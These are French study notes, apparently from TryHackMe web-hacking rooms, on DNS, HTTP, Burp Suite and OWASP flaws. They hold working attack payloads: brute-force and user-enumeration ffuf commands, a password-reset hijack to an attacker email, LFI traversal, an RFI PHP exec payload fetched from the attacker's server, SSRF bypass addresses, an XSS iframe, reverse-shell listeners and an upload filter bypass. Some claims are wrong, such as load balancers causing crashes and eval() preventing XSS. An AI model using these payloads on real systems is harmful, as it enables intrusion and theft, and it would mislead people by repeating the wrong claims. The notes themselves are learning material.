

# HOW THE WEB WORK

## DNS in detail 

* le DNS (domain name system) sert a traduire une url en une IP (mais ça c'est un type de dns précis)

* il utilise une hierachie **root** . ,  **top domain level (tdl)** .com .edu ... ,  **second domain level (sdl)** google ecole

     → exemple google.com (sld→google max 253car. et tld→.com)  
     →pour un sous domaine à gauche du sld genre www.lala.google.com (lala est le subdomain max 63car.)

### type de dns

* **A** record c'est pour IPv4
* **AAAA** record c'est pour IPv6
* **CNAME** record c'est regle pour rediger sur bon site
 en gros c'est si tu écris `exemple.fr` ça t'envoi sur `www.exemple.fr`

* **MX** record pour les mail

* **TXT** record pour des data en txt

### Requète DNS

Une rèquete dns marche la manière suivante :  
1. Lancement de requète 
2. Ton pc vérifie sur t'en à pas fait une au mm serv (cache)
3. Si non , t'as requète fait un tour par ton serv dns récursive (intern) qui stock des globaux style google,facebook 
4. Si pas dans globaux alors la requète remonte la hiérarchie pour demander à un serv root
5. Le serv dns root envoi t'as requète sur le tdl correspond à elle 
6. Le serv tdl envoi la rep à ton pc

on les fait avec nslookup

## HTTP in detail

* Http (HyperText Transfer Protcol)

* Https ('' Secure)

### type d'erreur

* plage d'erreur

| Plage de Codes | Type de Réponse           | Description Générale                                                                   | Exemples Courants                                                                                        |
| -------------- | ------------------------- | -------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------- |
| 100–199        | **Réponse d'information** | Le début de la requête a été reçu, le client doit continuer. Peu utilisé de nos jours. | *(Pas d'exemples courants listés)*                                                                       |
| 200–299        | **Succès**                | La requête a été reçue, comprise et acceptée.                                          | `200 OK`, `201 Created`                                                                                  |
| 300–399        | **Redirection**           | Redirige le client vers une autre ressource.                                           | `301 Moved Permanently`, `302 Found`                                                                     |
| 400–499        | **Erreur client**         | Erreurs causées par une mauvaise requête du client.                                    | `400 Bad Request`, `401 Not Authorised`, `403 Forbidden`, `404 Page Not Found`, `405 Method Not Allowed` |
| 500–599        | **Erreur serveur**        | Problèmes rencontrés par le serveur lors du traitement de la requête.                  | `500 Internal Server Error`, `503 Service Unavailable`                                                   |

* Détail des codes les plus courants : 


| Code | Nom                   | Description                                                        |
| ---- | --------------------- | ------------------------------------------------------------------ |
| 200  | OK                    | Requête traitée avec succès.                                       |
| 201  | Created               | Une ressource a été créée (ex : utilisateur, article).             |
| 301  | Moved Permanently     | Redirection permanente vers une nouvelle URL.                      |
| 302  | Found                 | Redirection temporaire vers une autre ressource.                   |
| 400  | Bad Request           | Requête invalide ou incomplète.                                    |
| 401  | Not Authorised        | Authentification nécessaire pour accéder à la ressource.           |
| 403  | Forbidden             | Accès interdit à la ressource, même authentifié.                   |
| 404  | Page Not Found        | La ressource demandée est introuvable.                             |
| 405  | Method Not Allowed    | La méthode HTTP utilisée n’est pas autorisée pour cette ressource. |
| 500  | Internal Server Error | Erreur interne du serveur.                                         |
| 503  | Service Unavailable   | Le serveur est surchargé ou en maintenance.                        |


### le header , source d'info: 

* En-têtes de Requête HTTP (Request Headers)

| En-tête           | Description                                                                                            |
| ----------------- | ------------------------------------------------------------------------------------------------------ |
| `Host`            | Indique au serveur quel site est demandé (utile si plusieurs sites sont hébergés sur le même serveur). |
| `User-Agent`      | Fournit des informations sur le navigateur du client (nom et version) pour une compatibilité optimale. |
| `Content-Length`  | Spécifie la taille (en octets) des données envoyées, par exemple dans un formulaire.                   |
| `Accept-Encoding` | Indique les types de compression que le client accepte (ex : gzip, deflate).                           |
| `Cookie`          | Envoie au serveur des données stockées côté client (identifiants de session, préférences, etc.).       |

* En-têtes de Réponse HTTP (Response Headers)

| En-tête            | Description                                                                                                      |
| ------------------ | ---------------------------------------------------------------------------------------------------------------- |
| `Set-Cookie`       | Permet au serveur d’enregistrer une information côté client, renvoyée à chaque requête suivante.                 |
| `Cache-Control`    | Indique combien de temps le contenu peut être mis en cache par le navigateur.                                    |
| `Content-Type`     | Précise le type de contenu retourné (HTML, CSS, JSON, image, etc.), pour que le client sache comment le traiter. |
| `Content-Encoding` | Informe sur le type de compression appliqué au contenu renvoyé (gzip, br, etc.).                                 |


## WEB in detail 

* **Front End (Client-Side)** - the way your browser renders a website.
* **Back End (Server-Side)** - a server that processes your request and returns a response.


* Les site sont fait en **html / java** mais le plus courant c'est **php / java**

* Le java sert à modif visuel style , j'appui sur un menu déroulant il déroule , etc...

* Si le site est pas bien fait il peut y avoir des informations dans le code source (inspecter l'élément dans le browser)

* De même si les formulaire ne sont pas bien fait on peut faire des injection soit **html**, soit **sql**


## Résumé & bonus

* Pour résumer, lorsque vous demandez un site web, votre ordinateur doit connaître l'adresse IP du serveur avec lequel il doit communiquer ;  
pour cela, il utilise le DNS. Ensuite, votre ordinateur communique avec le serveur web en utilisant un ensemble spécial de commandes appelé protocole HTTP ;  
le serveur web renvoie alors du HTML, du JavaScript, du CSS, des images, etc., que votre navigateur utilise ensuite pour formater et afficher correctement le site web.

* **LOAD BALANCER** servent à partager le flux de connection à site internet pour qu'il crash (ddos)

* **CDN** (content delivery network) sert à stocker les fichier de ton site pour les host

* **DB** (database) pas besoin d'expliquer

* **WAF** (web app firewall) → protection

* **Résume final**

     1. Request  
     2. local cache  
     3. recursive dns 
     4. root dns 
5. authoritative dns 
6. web app firewall 
7. load balancer 
8. connect webserver port 80(http) ou 443(https)
9. webserver reçois la requète get
10. web app demande intérroge la db
11. browser render le site 


# INTRODUCTION TO WEB HACKING

## Walking an application

* on peut jouer avec le css pour des paywall sur des site

* et check les response network dans devspec

## Content discovery

* Tout d'abord, posons-nous la question suivante, dans le contexte de la sécurité des applications web : qu'est-ce que le contenu ? Le contenu peut être beaucoup de choses : un fichier, une vidéo, une image, une sauvegarde, une fonctionnalité du site web. Lorsqu'on parle de *découverte de contenu*, on ne parle pas des éléments évidents visibles sur un site web ; il s'agit des éléments qui ne sont pas immédiatement présentés à l'utilisateur et qui n’étaient pas toujours destinés à être accessibles publiquement.

Ce contenu peut inclure, par exemple, des pages ou des portails destinés au personnel, d’anciennes versions du site, des fichiers de sauvegarde, des fichiers de configuration, des panneaux d’administration, etc.

Il existe trois méthodes principales pour découvrir du contenu sur un site web, que nous allons aborder : manuelle, automatisée et OSINT (renseignement en source ouverte).

* bien check les framework etc....

* What online tool can be used to identify what technologies a website is running?  
   → wappalyser

* Voici la traduction en français, tout en gardant les éléments de code et d'URL en anglais comme demandé :


* **S3 Buckets**

     Les **S3 Buckets** sont un service de stockage fourni par **Amazon AWS**, permettant aux utilisateurs de sauvegarder des fichiers, voire du contenu de sites web statiques, dans le cloud et accessibles via **HTTP** et **HTTPS**. Le propriétaire des fichiers peut définir des permissions d’accès pour rendre les fichiers publics, privés, voire modifiables. Il arrive que ces permissions soient mal configurées, donnant ainsi par erreur un accès public à des fichiers qui ne devraient pas l’être.

     Le format des **S3 buckets** est : `http(s)://{name}.s3.amazonaws.com`, où `{name}` est défini par le propriétaire, par exemple `tryhackme-assets.s3.amazonaws.com`.

     Les **S3 buckets** peuvent être découverts de plusieurs façons, comme en trouvant des **URLs** dans le code source d’un site web, dans des dépôts **GitHub**, ou encore via des méthodes automatisées. Une méthode fréquente d'automatisation consiste à utiliser le nom de l’entreprise suivi de termes courants tels que `{name}-assets`, `{name}-www`, `{name}-public`, `{name}-private`, etc.


* pour trouver de manière automatique on peut utiliser des logiciels (utilisation de worldlist) :

     1. Avec **ffuf** : `ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://IP_MACHINE_CIBLE/FUZZ`

     2. Avec **dirb** : `dirb http://10.10.72.195/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt`

     3. Avec **gobuster** : `gobuster dir --url http://10.10.72.195/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt`

## Subdomain Enumeration

* Plusieurs méthode pour le faire :
     1. Brute force  
     → `dnsrecon -t brt -d url`

     2. Osint  
     →`./sublist3r.py -d url`  
     (Pour accélérer le processus de découverte de sous-domaines en OSINT, 
      nous pouvons automatiser les méthodes ci-dessus à l’aide d’outils comme Sublist3r.) 

     3. Virtual host  
     →`ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u url`


## Auth bypass (à refaire parce que pas très bien compris)
### [Support d'aide](https://iritt.medium.com/tryhackme-authentication-bypass-walkthrough-83e8cd6559f8)

1. **énumération d'utilisateur** :  
→`ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u URL_SIGNUP -mr "username already exists"`

2. **Brute Force** :  
→`ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u URL_LOGIN -fc 200`


3. **MAil modif mdp** :  
→`curl 'http://10.10.73.13/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'`


## IDOR 

* IDOR → Insecure Direct Object Reference  
     c'est par exemple avoir avec des info en changeant l'url  `https://onlinestore.thm/order/1000/invoice` en
     `https://onlinestore.thm/order/1264/invoice` et bim tu choppe les info de la commande **1264**

* La sécurisation est généralement en **base64**
* Pour unhash un truc hash généralement tu utilise **md5** comme code/algo/langage si le hash est en format md5 bien sur

* Si tu peux pas choppe l'id , tu créer un compte est tu le swap

* Pour "man in the middle" les requète sur un site tu fais :  
     1. inspecter l'élément
     2. onglet network
     3. click sur la requète
     4. resend
     5. modif les info pour celle qu'on veut
     6. send 
     7. onglet response

## File inclusion

* concept :
![file inclusion concept](/img/la.png "image")  

* et le **rfi** c'est le même mais en remote

### proteger contre le fi ou rfi 

* Gardez le système et les services, y compris les frameworks d’applications web, à jour avec la dernière version.
* Désactivez les erreurs PHP pour éviter de divulguer le chemin de l’application et d’autres informations potentiellement révélatrices.
* Un pare-feu d’application web (WAF) est une bonne option pour aider à atténuer les attaques contre les applications web.
* Désactivez certaines fonctionnalités PHP qui causent des vulnérabilités d’inclusion de fichiers si votre application web n’en a pas besoin, telles que `allow\_url\_fopen` et `allow\_url\_include`.
* Analysez attentivement l’application web et autorisez uniquement les protocoles et wrappers PHP nécessaires.
* Ne faites jamais confiance aux entrées utilisateur et assurez-vous de mettre en place une validation appropriée des entrées contre l’inclusion de fichiers.
* Mettez en place une liste blanche pour les noms et emplacements de fichiers ainsi qu’une liste noire.


### Les challenges : 
1. pour changer une requète get en post pour aller faire charger un fichier précis :  
     `curl IP -X POST -d 'file=../../../../../etc/flag1'`

2. pour la même mais avec cookie pour se faire passer pour admin :  
      →inspecter l'élément puis onglet stockage ou application puis cookie et on modif les valeurs
     
 3. la même que la 1. sauf que le fichier est en php donc rajoute %00 après flag3 et si ça pose problem on enregistre l'output dans un fichier

 4. **RFI**  
      → on donc on utilise un python3 -m (serv python) ici `python3 -m http.server` (donne un port)
      → on créer un mini script : `nano host.txt` on met `<?php print exec('hostname'); ?>` dedans  
      → puis parti **FI** du RFI on tape l'url `IP/lala.php?file=http://sonIP:LE_PORT_PYTHON/host.txt` dans la bare de recherche
      →et voilà


## INTRO TO SSRF

* **Server-Side Request Forgery (SSRF)**

* Il existe deux types de vulnérabilité SSRF :  
> la première est une SSRF regular où les données sont renvoyées à l'écran de     l'attaquant.  
 La seconde est une vulnérabilité SSRF blind, où une SSRF se produit, mais aucune information n'est renvoyée à l'écran de l'attaquant.

* pour en trouver dans l'url du site doit y avoir une redirection srv de préférencre



### Se défendre du **ssrf**

Les développeurs plus conscients des risques liés aux vulnérabilités SSRF (Server-Side Request Forgery) peuvent mettre en place des vérifications dans leurs applications pour s’assurer que la ressource demandée respecte certaines règles. Il existe généralement deux approches pour cela : une **liste de refus (deny list)** ou une **liste d’autorisation (allow list)**.

---

*  Liste de refus (Deny List)

Une liste de refus permet toutes les requêtes sauf celles qui concernent des ressources spécifiées dans une liste ou correspondant à un modèle particulier. Une application web peut utiliser une liste de refus pour protéger des points de terminaison sensibles, des adresses IP ou des domaines afin d’éviter qu’ils soient accessibles au public, tout en permettant l’accès à d’autres ressources.

Un point de terminaison souvent restreint est **localhost**, qui peut contenir des données sur les performances du serveur ou d'autres informations sensibles. Des noms de domaine tels que `localhost` et `127.0.0.1` figureraient donc sur une liste de refus.

Cependant, les attaquants peuvent contourner une liste de refus en utilisant des références alternatives à `localhost`, telles que :
`0`, `0.0.0.0`, `0000`, `127.1`, `127.*.*.*`, `2130706433`, `017700000001` ou encore des sous-domaines avec un enregistrement DNS pointant vers l’adresse IP `127.0.0.1`, comme `127.0.0.1.nip.io`.

Dans un environnement **cloud**, il serait également judicieux de bloquer l'accès à l’adresse IP `169.254.169.254`, qui contient des **métadonnées** du serveur cloud déployé, y compris possiblement des informations sensibles. Un attaquant peut contourner cette restriction en enregistrant un sous-domaine sur son propre domaine avec un enregistrement DNS pointant vers l’adresse IP `169.254.169.254`.

---

### Liste d’autorisation (Allow List)

Une liste d’autorisation fonctionne à l’inverse : toutes les requêtes sont refusées **sauf** celles figurant sur la liste ou correspondant à un modèle spécifique, comme une règle imposant que toute URL utilisée en paramètre commence par `https://website.thm`.

Un attaquant pourrait contourner cette règle en créant un **sous-domaine** sur un nom de domaine lui appartenant, comme :
`https://website.thm.attackers-domain.thm`.
La logique de l’application autoriserait alors cette entrée, permettant à l’attaquant de contrôler la requête HTTP interne.

---

### Redirection ouverte (Open Redirect)

Si les contournements précédents échouent, un attaquant peut avoir une dernière astuce : l’**open redirect** (redirection ouverte). Il s’agit d’un point de terminaison sur le serveur qui redirige automatiquement le visiteur vers une autre adresse web.

Par exemple :
`https://website.thm/link?url=https://tryhackme.com`
Ce point de terminaison pourrait avoir été conçu pour suivre le nombre de clics pour des raisons marketing/publicitaires. Mais imagine qu’il existe une potentielle vulnérabilité SSRF avec des règles strictes n’autorisant que des URL commençant par `https://website.thm/`. L’attaquant pourrait exploiter cette fonctionnalité pour rediriger la requête HTTP interne vers un domaine de son choix.

---

* en résumé 

![file inclusion concept](/img/lo.png "image") 

* et il peut se faire via des formulaire de d'update par exemple 


## Intro to Cross-site Scripting

* LE XSS (Cross-Site Scripting) :  
 is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users

* ça marche via js donc ,  
l'url ,le dom donc utilisation de eval() pour se proteger ,   
peut etre stocker dans des db,  
blind xss (on peut pas le voir taff) xss hunter express pour pouvoir le detect {il ressemble au stored xss}

* mais ça peut inclure aussi de l'écoute de site avec un serveur netcat (nc)


## BURP SUITE
### LA BASE :

* sert à attack web & mobile app (style man in the middle)

* les différentes feature de burpsuite
---
> **Proxy** : Le **Burp Proxy** est l’aspect le plus renommé de **Burp Suite**. Il permet l’interception et la  modification des requêtes et des réponses lors de l’interaction avec des applications web.

> **Repeater** : Une autre fonctionnalité bien connue. **Repeater** permet de capturer, modifier et renvoyer la même requête plusieurs fois. Cette fonctionnalité est particulièrement utile pour concevoir des charges utiles par essais et erreurs (par exemple, en cas de **SQLi** – injection de code SQL) ou pour tester la fonctionnalité d’un **endpoint** à la recherche de vulnérabilités.

> **Intruder** : Malgré les limitations de fréquence dans **Burp Suite Community**, **Intruder** permet d’envoyer massivement des requêtes à des **endpoints**. Il est couramment utilisé pour des attaques par force brute ou pour du **fuzzing** de points d’accès.

> **Decoder** : **Decoder** offre un service précieux pour la transformation de données. Il peut décoder des informations capturées ou encoder des charges utiles avant de les envoyer vers la cible. Bien que d’autres services existent à cet effet, utiliser **Decoder** directement dans **Burp Suite** peut être très efficace.

> **Comparer** : Comme son nom l’indique, **Comparer** permet de comparer deux segments de données, au niveau des mots ou des octets. Bien que cette fonction ne soit pas exclusive à **Burp Suite**, la possibilité d’envoyer directement de gros volumes de données à cet outil via un simple raccourci clavier accélère considérablement le processus.

> **Sequencer** : **Sequencer** est généralement utilisé pour évaluer le caractère aléatoire des jetons, comme les valeurs de cookies de session ou d’autres données supposément générées de manière aléatoire. Si l’algorithme utilisé pour générer ces valeurs manque d’un véritable caractère aléatoire, cela peut ouvrir la voie à des attaques destructrices.

> Au-delà des fonctionnalités intégrées, la base de code Java de **Burp Suite** permet le développement d’**extensions** pour enrichir les capacités du framework. Ces extensions peuvent être écrites en Java, en Python (via l’interpréteur Java **Jython**) ou en Ruby (via l’interpréteur Java **JRuby**). Le module **Burp Suite Extender** permet de charger rapidement et facilement des extensions dans le framework, tandis que la place de marché, appelée **BApp Store**, permet de télécharger des modules tiers. Bien que certaines extensions nécessitent une licence professionnelle pour être intégrées, un nombre conséquent d’extensions reste disponible pour **Burp Community**. Par exemple, le module **Logger++** permet d’étendre les fonctionnalités de journalisation intégrées à **Burp Suite**.

---

* **Le proxy** :
 > **LES REQUETES D'INTERCEPTION** :  
Elle bloque la requete faite par le client entre lui et le serv pour pouvoir les modif etc... (on appui sur `intercept is on` pour l'activer)  
 
 > **TAKING CONTROL** :  
La capacité d’intercepter les requêtes permet aux testeurs de prendre le contrôle total du trafic web, ce qui est inestimable pour tester des applications web.  

 > **CAPTURE AND LOGGING** :  
Burp Suite capture et journalise par défaut les requêtes effectuées via le proxy, même lorsque l’interception est désactivée. Cette fonctionnalité de journalisation peut être utile pour une analyse ultérieure et la révision des requêtes précédentes.  

 > **WEBSOCKET SUPPORT** :  
Burp Suite capture également les communications WebSocket, fournissant une aide supplémentaire lors de l’analyse des applications web.  

 > **LOG AND HISTORY** :  
Les requêtes capturées peuvent être consultées dans les sous-onglets de l’historique HTTP et de l’historique WebSockets, ce qui permet une analyse rétrospective et l’envoi des requêtes vers d’autres modules de Burp si nécessaire.  

 > **MATCH AND REPLACE** :  
La section « match and replace » dans les paramètres du Proxy permet d’utiliser des expressions régulières (regex) pour modifier les requêtes entrantes et sortantes. Cette fonctionnalité permet d’effectuer des modifications dynamiques, comme changer l’agent utilisateur ou manipuler les cookies.  

---

* info utile :
 >Lorsque la configuration du proxy est active et que l’interception est activée dans Burp Suite, votre navigateur se bloque à chaque requête effectuée.  
Faites attention à ne pas laisser l’interception activée par inadvertance, car cela peut empêcher votre navigateur d’envoyer des requêtes.  
Un clic droit sur une requête dans Burp Suite permet d’effectuer diverses actions, comme la transmettre (forward), la supprimer (drop), l’envoyer vers d’autres outils ou choisir des options dans le menu contextuel.

---

* BURP fait une "map" du site dans l'onglet target

* **IMPORTANT** :  
> si on veut le faire sur un site en https   on peut pas donc :  
     
     1. Avec le proxy d'activer sur install :  http://burp/cert

     2. va dans les parametre de firefox (écrit `about:preferences`) puis certificates puis view

     3. import le fichier downloads 

     4. set trust this ca to identify website 

### REPEATER

* `crtl+r` sur un requete pour l'envoyer dans l'onglet repeater

* En essence, **Burp Suite Repeater** nous permet de modifier et de renvoyer des requêtes interceptées vers une cible de notre choix. Il permet de prendre des requêtes capturées via le proxy de Burp et de les manipuler, puis de les renvoyer autant de fois que nécessaire. Il est également possible de créer manuellement des requêtes depuis zéro, de manière similaire à l’utilisation d’un outil en ligne de commande comme **cURL**.

* La capacité à modifier et renvoyer des requêtes plusieurs fois rend **Repeater** extrêmement utile pour l’exploration manuelle et le test des points de terminaison (endpoints). Il offre une interface graphique conviviale pour élaborer les charges utiles des requêtes, et propose plusieurs vues de la réponse, y compris un moteur de rendu pour une représentation graphique.

Il y a six section principales

1. Request list : Située en haut à gauche de l’onglet, elle affiche la liste des requêtes Repeater. Plusieurs requêtes peuvent être gérées simultanément, et chaque nouvelle requête envoyée au Repeater apparaîtra ici.

2. request control : Placés juste en dessous de la liste des requêtes, ces contrôles permettent d’envoyer une requête, d’annuler une requête bloquée, et de naviguer dans l’historique des requêtes

3. request and response view : Occupant la majeure partie de l’interface, cette section affiche les vues de la Requête et de la Réponse. On peut modifier la requête dans la vue Requête, puis l’envoyer ; la réponse correspondante s’affichera dans la vue Réponse.

4. layout option : Situées en haut à droite de la vue Requête/Réponse, ces options permettent de personnaliser la disposition des vues. Par défaut, l’affichage est côte à côte (horizontal), mais on peut également choisir un affichage vertical ou séparer les vues dans des onglets distincts.

5. inspector : Positionné sur le côté droit, l’Inspecteur permet d’analyser et de modifier les requêtes de manière plus intuitive que via l’éditeur brut. Nous explorerons cette fonctionnalité dans une tâche ultérieure.

6. target : Situé au-dessus de l’Inspecteur, le champ Cible indique l’adresse IP ou le domaine vers lequel les requêtes sont envoyées. Lorsque des requêtes sont envoyées au Repeater depuis d’autres composants de Burp Suite, ce champ est rempli automatiquement.

* quand tu modif une requete laisse deux ligne vide à la fin

### INTRUDER

* Intruder est l'outil de fuzzing intégré de Burp Suite qui permet la modification automatisée des requêtes et les tests répétitifs avec des variations des valeurs d'entrée. En utilisant une requête capturée (souvent à partir du module Proxy), Intruder peut envoyer plusieurs requêtes avec des valeurs légèrement modifiées en fonction des configurations définies par l'utilisateur. Il sert à diverses fins, telles que la force brute des formulaires de connexion en substituant les champs nom d'utilisateur et mot de passe par des valeurs provenant d'une liste de mots ou en effectuant des attaques de fuzzing à l'aide de listes de mots pour tester les sous-répertoires, les points de terminaison ou les hôtes virtuels. La fonctionnalité d'Intruder est comparable à celle d'outils en ligne de commande comme Wfuzz ou ffuf.

---

* les sous onglet

>**Positions :**  
Cet onglet nous permet de sélectionner un type d'attaque (que nous aborderons dans une tâche future) et de configurer les emplacements où nous souhaitons insérer nos charges utiles dans le modèle de requête.  
     →Burp Suite tente automatiquement d’identifier les emplacements les plus probables où insérer des charges utiles. Ces emplacements sont mis en surbrillance en vert et encadrés par des symboles de section (§).

     Sur le côté droit de l’interface, on trouve les boutons suivants : **Add §**, **Clear §**, et **Auto §** :  

     • Le bouton **Add §** permet de définir manuellement de nouveaux emplacements en les sélectionnant dans l’éditeur de requête, puis en cliquant sur ce bouton.  
     • Le bouton **Clear §** supprime tous les emplacements définis, offrant ainsi une page vierge pour définir nos propres emplacements.  
     • Le bouton **Auto §** tente automatiquement d’identifier les emplacements les plus probables en fonction de la requête. Cette fonctionnalité est utile si nous avons supprimé les emplacements par défaut et souhaitons les restaurer.  







>**Payloads :**  
Ici, nous pouvons sélectionner les valeurs à insérer aux emplacements définis dans l’onglet *Positions*. Nous disposons de diverses options de charge utile, comme le chargement d’éléments depuis une liste de mots. La manière dont ces charges sont insérées dans le modèle dépend du type d’attaque choisi dans l’onglet *Positions*. L’onglet *Payloads* nous permet également de modifier le comportement d’Intruder concernant les charges utiles, par exemple en définissant des règles de prétraitement pour chaque charge (ajout d’un préfixe ou suffixe, recherche/remplacement, ou exclusion de charges en fonction d’une expression régulière définie).  

     4 sous section :  

     1. Payload Sets :
     Cette section nous permet de choisir la position pour laquelle nous souhaitons configurer un ensemble de charges utiles, et de sélectionner le type de charge utile à utiliser.  

     Lorsque l'on utilise des types d’attaques qui ne permettent qu’un seul ensemble de charges utiles (Sniper ou Battering Ram), la liste déroulante "Payload Set" n’aura qu’une seule option, quel que soit le nombre de positions définies.  
     
     En revanche, si l’on utilise des types d’attaques nécessitant plusieurs ensembles (Pitchfork ou Cluster Bomb), il y aura un élément dans la liste déroulante pour chaque position.  

     Remarque : Lors de l’attribution des numéros dans la liste déroulante "Payload Set" pour plusieurs positions, suivez un ordre de haut en bas, puis de gauche à droite.  
     
     Par exemple, avec deux positions (username=§pentester§&password=§Expl01ted§), le premier élément dans la liste correspondra au champ username, et le second au champ password.  

     2. Payload Settings :  
     Cette section propose des options spécifiques au type de charge utile sélectionné pour l’ensemble en cours.  

     Par exemple, avec le type "Simple list", on peut ajouter ou supprimer manuellement des charges à l’aide de la boîte de texte "Add", de l’option "Paste lines", ou en les chargeant depuis un fichier. Le bouton "Remove" supprime la ligne sélectionnée, et le bouton "Clear" efface toute la liste.  

     Faites attention lors du chargement de listes volumineuses, car cela peut faire planter Burp.  

     Chaque type de charge utile dispose de ses propres options et fonctionnalités.  

     3. Payload Processing :  
     Dans cette section, on peut définir des règles à appliquer à chaque charge avant qu’elle ne soit envoyée à la cible.  
     
     Par exemple, on peut mettre chaque mot en majuscules, ignorer les charges correspondant à une expression régulière, ou appliquer d'autres transformations ou filtres.  

     Bien que cette section ne soit pas utilisée fréquemment, elle peut être très utile dans des attaques nécessitant un traitement spécifique des charges.  

     4. Payload Encoding :  
     Cette section permet de personnaliser les options d'encodage des charges.  

     Par défaut, Burp Suite applique un encodage URL pour assurer une transmission sécurisée des charges.  
     
     Toutefois, il peut être utile de modifier ce comportement selon le contexte.  

     On peut remplacer l'encodage URL par défaut en modifiant la liste des caractères à encoder, ou en décochant l’option "URL-encode these characters".



>**Resource Pool :**  
Cet onglet n’est pas particulièrement utile dans la version Community de Burp. Il permet de répartir les ressources entre différentes tâches automatisées dans Burp Professional. Sans accès à ces tâches automatisées, cet onglet a une importance limitée.






>**Settings (Paramètres) :**  
Cet onglet permet de configurer le comportement de l’attaque. Il concerne principalement la manière dont Burp gère les résultats et l’attaque elle-même. Par exemple, on peut marquer les requêtes contenant un texte spécifique ou définir la façon dont Burp doit réagir aux réponses de redirection (codes 3xx).

#### Type d'attaque : 


Voici la traduction en français du texte visible dans l’image :

---

1. **Sniper** : Le type d'attaque Sniper est l'option par défaut et la plus couramment utilisée. Il parcourt les payload en les insérant une à une dans chaque position définie dans la requête. Les attaques Sniper parcourent toutes les payload de manière linéaire, ce qui permet un test précis et ciblé.

2. **Battering Ram** :  
Le type d'attaque Battering Ram diffère de Sniper en ce qu'il envoie toutes les payload simultanément, chaque charge utile étant insérée dans sa position respective. Ce type d'attaque est utile lors des tests de conditions de course ou lorsque les payload doivent être envoyées en même temps.

3. **Pitchfork** (20 payload max) :  
Le type d'attaque Pitchfork permet de tester simultanément plusieurs positions avec différentes payload. Il permet au testeur de définir plusieurs ensembles de payload, chacun associé à une position spécifique dans la requête. Les attaques Pitchfork sont efficaces lorsqu'il y a des paramètres distincts nécessitant des tests séparés.

4. **Cluster bomb** (idem):  
Le type d'attaque Bombe à fragmentation combine les approches Sniper et Pitchfork. Elle effectue une attaque de type Sniper sur chaque position mais teste simultanément toutes les payload de chaque ensemble. Ce type d'attaque est utile lorsque plusieurs positions ont des payload différentes et que l'on souhaite toutes les tester ensemble.

---

### OTHER MODULE

1. Decode :  
     → il décode et encode des données (smart decode pour le faire auto)

2. Comparer :  
     → il compare 2 text (que ce soit requete[click droite puis send to comparer] ou autre )

3. Sequencer :  
     →sert à évaluer la randomness d'un token pour voir si crypter ou pas

4. Organizer (read-only) :  
     →Permet de faire des copie des requete souhaiter pour mieux s'organiser

## OWASP TOP 10 -2021


1. Broken acces control :  

bypass the authorisation   
exemple : idor 

2. Cryptographic Failures :  

capturer une requete juste avant qu'elle se fasse hash

ou de la non hash de base de donnée

3. Injection :  

déjà vu

4. insecure design  

si ton site est mal fait on peut récup des info 

5. security misconfiguration  
voilà

6. pas à jour  
voilà

7. Identification and Authentication Failure  
si ton code d'ident est mal fait

8.  Software and Data Integrity Failures  
tout pour pas que les data soit modif sinon faille

9. Security Logging and Monitoring Failures  

c'est bien pour plus garder les failles

10. Server-Side Request Forgery (SSRF)  
faire faire une requete au serv web à nous via netcat (nc -lvp n°port)

## OWASP Juice Shop

montre les différente faille :  
comment les identifié et exploité

* pour email injection c'est un peut des injection sql faut test avec burp on met dans le répéter

* pour le brute force on fait : intruder sur burp suite

* Sensitive data expo : on joue avec l'url pour chopper la version avec le dossier est fichier   
  → si un fichier faut pas ce del. tu met %00 ou %2500 avant son extansion et c'est good

* des truc peuvent ce cacher dans le devtool selon la session (admin ou user ou support)

* jouer avec l'url `lalal/panier/1`  → `lalal/panier/2`

* test des xss des qu'on peut (url,nav,form, tout) avec le script : `<iframe src=”javascript:alert('xss')”>`  
→ pour le rendre persistent on le met dans le header via burp 

## UPLOAD VULNARIBILITY & ctf rick

* overwriting → genre t'a un fichier sur le site , tu essaye de le remplacer avec le tien est il porte le meme nom donc ça l'overwrite :)

* scan toute les page d'un site :  
`gobuster dir -u URL -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt`

→ n'a pas marcher sur le ctf de rick alors autre méthode plus complète en plus : `dirsearch -u IP`


* dans un truc de commande faut utiliser ls -la car plus précis ls -l (inclusion des fichier cacher)

* tu peux aussi upload un script pour allez récup soit des info soit pouvoir te ballader dans les fichier du site en mode reverse shell (tu scan avec netcan port 443 | `nc -lvnp 443`)

* tu peux bypass le filtre avec `llala.jpg.php`